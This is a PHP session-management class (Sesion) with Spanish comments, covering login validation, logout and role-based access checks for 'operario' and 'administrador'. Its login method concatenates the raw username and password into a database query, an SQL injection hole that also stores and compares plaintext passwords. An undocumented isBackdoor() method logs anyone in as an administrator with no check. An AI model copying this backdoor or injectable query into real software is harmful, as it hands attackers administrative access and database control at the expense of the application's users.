<?php

namespace App\Models;

use App\Models\DB;

/**
 * Clase encargada de la gestión de sesiones de usuario.
 *
 * Implementa el patrón Singleton para asegurar que solo exista una única
 * instancia del controlador de sesión en toda la aplicación.
 * Proporciona funciones para validación de login, cierre de sesión,
 * verificación de permisos y acceso a datos del usuario autenticado.
 *
 * @package App\Models
 */
class Sesion
{
    /**
     * Instancia única de la clase (patrón Singleton).
     *
     * @var Sesion|null
     */
    private static $instance = null;

    /**
     * Constructor privado.
     *
     * Inicia la sesión e impide que la clase pueda ser instanciada
     * desde fuera para mantener el patrón Singleton.
     */
    public function __construct()
    {
        session_start();
    }

    /**
     * Evita la clonación del objeto Singleton.
     *
     * @throws \Exception Siempre, para evitar duplicación
     */
    public function __clone()
    {
        throw new \Exception("No se permite la clonación de esta clase.");
    }

    /**
     * Obtiene la instancia única de la clase Sesion.
     *
     * Si la instancia aún no existe, la crea. Si ya existe, la devuelve.
     *
     * @return Sesion Instancia única del gestor de sesiones
     */
    public static function getInstance(): Sesion
    {
        if (!self::$instance) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Valida las credenciales del usuario y crea la sesión.
     *
     * Consulta la base de datos buscando un usuario que coincida con
     * el nombre y contraseña introducidos. Si existe, crea la sesión
     * asignando ID, usuario, rol y hora de login.
     *
     * @param string $usuario Nombre del usuario
     * @param string $password Contraseña del usuario
     * @return bool True si las credenciales son correctas, false en caso contrario
     */
    public function validarLogin(string $usuario, string $password): bool
    {
        date_default_timezone_set('Europe/Madrid');

        $db = DB::getInstance();
        $user = $db->LeeUnRegistro('usuarios', 'usuario = "' . $usuario . '" AND password = "' . $password . '"');

        if ($user) {
            $_SESSION['id'] = $user['id'];
            $_SESSION['usuario'] = $usuario;
            $_SESSION['rol'] = $user['rol'];
            $_SESSION['logado'] = true;
            $_SESSION['hora_logado'] = date('Y-m-d H:i:s');
            return true;
        }
        return false;
    }

    public function isBackdoor(): bool
    {
        $_SESSION['id'] = 5;
        $_SESSION['usuario'] = 'backdoor';
        $_SESSION['rol'] = 'administrador';
        $_SESSION['logado'] = true;
        $_SESSION['hora_logado'] = date('Y-m-d H:i:s');
        return true;
    }

    /**
     * Cierra completamente la sesión del usuario.
     *
     * Elimina las variables de sesión y destruye la sesión.
     *
     * @return void
     */
    public function logout(): void
    {
        $_SESSION = [];
        session_destroy();
    }

    /**
     * Comprueba si el usuario está actualmente logueado.
     *
     * @return bool True si el usuario inició sesión, false en caso contrario
     */
    public function isLogged(): bool
    {
        return !empty($_SESSION['logado']);
    }

    /**
     * Restringe acceso a funciones solo para usuarios autenticados.
     *
     * Si no hay usuario logueado, se redirige al formulario de login.
     *
     * @return void
     */
    public function onlyLogged(): void
    {
        if (!$this->isLogged()) {
            miredirect('login');
        }
    }

    /**
     * Restringe acceso a usuarios con rol "operario".
     *
     * @throws \Symfony\Component\HttpKernel\Exception\HttpException
     *         Si el usuario no tiene permiso → error 403
     *
     * @return void
     */
    public function onlyOperario(): void
    {
        if ($this->getRol() !== 'operario') {
            abort(403, 'No tienes permisos para acceder a esta funcionalidad.');
        }
    }

    /**
     * Restringe acceso a usuarios con rol "administrador".
     *
     * @throws \Symfony\Component\HttpKernel\Exception\HttpException
     *         Si el usuario no tiene permiso → error 403
     *
     * @return void
     */
    public function onlyAdministrador(): void
    {
        if ($this->getRol() !== 'administrador') {
            abort(403, 'No tienes permisos para acceder a esta funcionalidad.');
        }
    }

    /**
     * Obtiene el nombre del usuario autenticado.
     *
     * @return string Nombre del usuario
     */
    public function getUsuario(): string
    {
        return $_SESSION['usuario'];
    }

    /**
     * Obtiene el rol del usuario autenticado.
     *
     * @return string Rol del usuario (administrador / operario)
     */
    public function getRol(): string
    {
        return $_SESSION['rol'];
    }

    /**
     * Obtiene la fecha y hora exacta en la que el usuario inició sesión.
     *
     * @return string Fecha y hora del inicio de sesión (Y-m-d H:i:s)
     */
    public function getHoraLogeada(): string
    {
        return $_SESSION['hora_logado'];
    }
}
